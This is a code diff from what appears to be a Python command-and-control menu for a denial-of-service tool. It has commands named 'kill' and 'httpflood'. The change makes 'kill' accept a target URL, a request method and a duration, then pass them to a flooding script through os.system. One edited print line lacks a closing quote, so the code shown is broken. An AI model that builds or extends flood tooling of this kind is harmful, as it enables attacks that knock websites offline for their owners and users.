@@ -601,11 +601,12 @@ def main():
         elif "kill" in cnc:
             try:
                 url = cnc.split()[1]
-                method = cnc.split()[2]
-                os.system(f'python3 url.py {url}')
+                methods = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'python3 url.py {url} {methods} {time}')
             except IndexError:
-                print('Usage: kill <url>')
-                print('Example: kill http://example.com')
+                print('Usage: kill <web> <type : get> <durasi>)
+                print('Example: kill https://example.com get 60')
 
         elif "httpflood" in cnc:
             try:
